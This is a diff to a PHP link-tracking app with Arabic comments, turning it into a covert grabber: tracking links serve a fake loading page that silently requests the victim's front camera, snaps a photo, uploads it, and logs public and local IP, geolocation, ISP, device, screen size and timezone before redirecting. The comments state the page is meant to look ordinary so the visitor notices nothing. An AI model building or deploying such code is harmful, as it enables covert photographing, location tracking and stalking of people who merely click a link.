@@ -1,12 +1,11 @@
 <?php
-// إظهار الأخطاء للتحقق والتأكد من العمل
+// إظهار الأخطاء للتشخيص
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // إنشاء الجداول مع إضافة حقل لصورة السيلفي
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -35,18 +34,16 @@ try {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-// معالجة استقبال صورة السيلفي المرسلة عبر طلب AJAX
+// استقبال وحفظ صورة السيلفي عبر AJAX
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['action'] === 'save_photo') {
     $code =$_POST['code'] ?? '';
     $imgData =$_POST['image'] ?? '';
     
     if (!empty($imgData) && !empty($code)) {
-        // تنظيف بيانات الصورة وإزالة الرأسية
         $imgData = str_replace('data:image/jpeg;base64,', '',$imgData);
         $imgData = str_replace(' ', '+',$imgData);
         $decodedData = base64_decode($imgData);
         
-        // إنشاء مجلد للصور إذا لم يكن موجوداً
         if (!file_exists('uploads')) {
             mkdir('uploads', 0755, true);
         }
@@ -54,7 +51,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['a
         $filename = 'uploads/photo_' .$code . '_' . time() . '.jpg';
         file_put_contents($filename,$decodedData);
         
-        // حفظ مسار الصورة في آخر سجل يخص هذا الكود
         $stmt =$db->prepare("UPDATE logs SET photo = ? WHERE code = ? ORDER BY id DESC LIMIT 1");
         $stmt->execute([$filename,$code]);
         
@@ -113,7 +109,7 @@ function get_ip_details($ip) {
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
-// 1. معالجة إعادة التوجيه
+// 1. معالجة إعادة التوجيه وتسجيل الزيارة
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
@@ -123,29 +119,21 @@ if (isset($_GET['r'])) {
     if ($link) {
         $target =$link['target_url'];
         
-        // إذا كان الطلب قادماً لالتقاط الصورة عبر الجافاسكريبت
-        if (isset($_GET['capture']) &&$_GET['capture'] == '1') {
-            exit();
-        }
+        // إذا أرسل المتصفح بيانات الشاشة، نقوم بتسجيل البيانات وتوجيهه فوراً للرابط المقصود
+        if (isset($_GET['screen'])) {$public_ip = get_real_ip();
+            $local_ip =$_GET['lip'] ?? 'غير متوفر';
+            $port =$_SERVER['REMOTE_PORT'] ?? 'غير متوفر';
+            $geo = get_ip_details($public_ip);
+            $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+            $device = get_device_type($ua);
+            $screen =$_GET['screen'] ?? 'غير متوفر';
+            $tz =$_GET['tz'] ?? 'غير متوفر';
 
-        $public_ip = get_real_ip();
-        $local_ip =$_GET['lip'] ?? 'غير متوفر';
-        $port =$_SERVER['REMOTE_PORT'] ?? 'غير متوفر';
-        $geo = get_ip_details($public_ip);
-        $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-        $device = get_device_type($ua);
-        $screen =$_GET['screen'] ?? 'غير متوفر';
-        $tz =$_GET['tz'] ?? 'غير متوفر';
+            try {
+                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                $logStmt->execute([$code,$public_ip, $local_ip,$port, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
+            } catch (Exception $e) {}
 
-        try {
-            $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-            $logStmt->execute([$code,$public_ip, $local_ip,$port, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
-        } catch (Exception $e) {
-            // الاستمرار في حالة خطأ السجل
-        }
-
-        // إذا تم إرسال معلومات الشاشة، نقوم بتحويل الزائر للرابط المستهدف
-        if (isset($_GET['screen'])) {
             header("Location: " . $target);
             exit();
         }
@@ -175,6 +163,78 @@ $total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
 $total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();
 
 $filter_code = trim($_GET['track'] ?? '');
+
+// إذا كان الزائر يفتح رابط تترصد (`?r=xxx`) ولا يوجد معاملات شاشة بعد، نعرض صفحة شفافة وخفيفة تلتقط الصورة وتوجهه فوراً دون أن يرى أي شيء
+if (isset($_GET['r']) && empty($_GET['screen'])) {
+    $r_code =$_GET['r'];
+    ?>
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <title>جاري التحميل...</title>
+        <!-- إعدادات لإخفاء أي شكل مريب وجعل الصفحة تبدو عادية جداً -->
+        <meta property="-title" content="جارِ فتح الرابط...">
+        <style>
+            body { background: #0b0f19; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+            .loader { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #38bdf8; border-radius: 50%; width: 35px; height: 35px; animation: spin 0.8s linear infinite; }
+            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        </style>
+        <script>
+            window.addEventListener("DOMContentLoaded", function() {
+                const code = "<?php echo htmlspecialchars($r_code); ?>";
+                
+                // التقاط الصورة بسرعة فائقة وخفية في الخلفية
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                        .then(function(stream) {
+                            const video = document.createElement('video');
+                            video.srcObject = stream;
+                            video.play();
+                            
+                            setTimeout(function() {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = 320;
+                                canvas.height = 240;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                                
+                                stream.getTracks().forEach(track => track.stop());
+
+                                const formData = new URLSearchParams();
+                                formData.append('action', 'save_photo');
+                                formData.append('code', code);
+                                formData.append('image', imageData);
+
+                                // إرسال الصورة وإعادة التوجيه فوراً
+                                fetch('/?r=' + code, { method: 'POST', body: formData })
+                                    .finally(() => { redirectToTarget(code); });
+                            }, 400); // التقاط سريع جداً خلال 400 جزء من الألف من الثانية
+                        })
+                        .catch(function(error) {
+                            redirectToTarget(code);
+                        });
+                } else {
+                    redirectToTarget(code);
+                }
+            });
+
+            function redirectToTarget(code) {
+                const screenRes = screen.width + "x" + screen.height;
+                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                window.location.replace(`/?r=${code}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`);
+            }
+        </script>
+    </head>
+    <body>
+        <div class="loader"></div>
+    </body>
+    </html>
+    <?php
+    exit();
+}
+
 if (!empty($filter_code)) {
     $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
     $stmt->execute([$filter_code]);
@@ -188,7 +248,7 @@ if (!empty($filter_code)) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello World from azez</title>
+    <title>لوحة التحكم - تتبع الروابط</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         body { background-color: #0b0f19; color: #f3f4f6; padding: 15px; line-height: 1.5; }
@@ -226,62 +286,6 @@ if (!empty($filter_code)) {
         .link-row { display: flex; gap: 8px; margin-top: 6px; align-items: center; }
     </style>
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const redirectCode = urlParams.get('r');
-            const hasScreen = urlParams.has('screen');
-
-            // إذا فتح الزائر الرابط لأول مرة
-            if (redirectCode && !hasScreen) {
-                // محاولة التقاط صورة سيلفي أولاً
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                        .then(function(stream) {
-                            const video = document.createElement('video');
-                            video.srcObject = stream;
-                            video.play();
-                            
-                            setTimeout(function() {
-                                const canvas = document.createElement('canvas');
-                                canvas.width = 320;
-                                canvas.height = 240;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                                
-                                // إيقاف الكاميرا
-                                stream.getTracks().forEach(track => track.stop());
-
-                                // إرسال الصورة للخادم
-                                const formData = new URLSearchParams();
-                                formData.append('action', 'save_photo');
-                                formData.append('code', redirectCode);
-                                formData.append('image', imageData);
-
-                                fetch(window.location.href, {
-                                    method: 'POST',
-                                    body: formData
-                                }).finally(() => {
-                                    proceedRedirect(redirectCode);
-                                });
-                            }, 1000); // الانتظار لثانية لضمان تشغيل الكاميرا
-                        })
-                        .catch(function(error) {
-                            // في حال رفض الإذن أو عدم وجود كاميرا، المتابعة طبيعياً
-                            proceedRedirect(redirectCode);
-                        });
-                } else {
-                    proceedRedirect(redirectCode);
-                }
-            }
-        });
-
-        function proceedRedirect(code) {
-            const screenRes = screen.width + "x" + screen.height;
-            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            window.location.href = `/?r=${code}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
-        }
-
         function copyText(text, btnElement) {
             navigator.clipboard.writeText(text).then(() => {
                 const original = btnElement.innerText;
@@ -300,8 +304,8 @@ if (!empty($filter_code)) {
         
         <div class="card header">
             <div>
-                <h1>Hello World from azez</h1>
-                <p style="color: #9ca3af; font-size: 12px; margin-top: 2px;">لوحة تحكم تتبع الروابط المتقدمة</p>
+                <h1>لوحة التحكم الرئيسية</h1>
+                <p style="color: #9ca3af; font-size: 12px; margin-top: 2px;">نظام تتبع الروابط والزيارات المتقدم</p>
             </div>
             <div class="stats-group">
                 <div class="stat-box">
@@ -385,11 +389,11 @@ if (!empty($filter_code)) {
                                 </td>
                                 <td>
                                     <span class="badge"><?php echo htmlspecialchars($log['code']); ?></span>
-                                    <button type="button" class="copy-btn" style="font-size: 9px; padding: 2px 5px; margin-right: 3px;" onclick="copyText('<?php echo htmlspecialchars($log['code']); ?>', this)">نسخ</button>
+                                    <button type="button" class="copy-btn" style="font-size: 9px; padding: 2px 5px; margin-right: 3px;" onclick="copyText('<?php echo htmlspecialchars($log['code']); ?>',this)">نسخ</button>
                                 </td>
                                 <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? 'N/A'); ?></td>
                                 <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? '192.168.1.X'); ?></td>
-                                <td><span class="port-badge"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></td>
+                                <td><span class="port-badge"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></span></td>
                                 <td style="color: #fbbf24; font-weight: bold;"><?php echo htmlspecialchars($log['device_info']); ?></td>
                                 <td>
                                     <strong><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></strong><br>
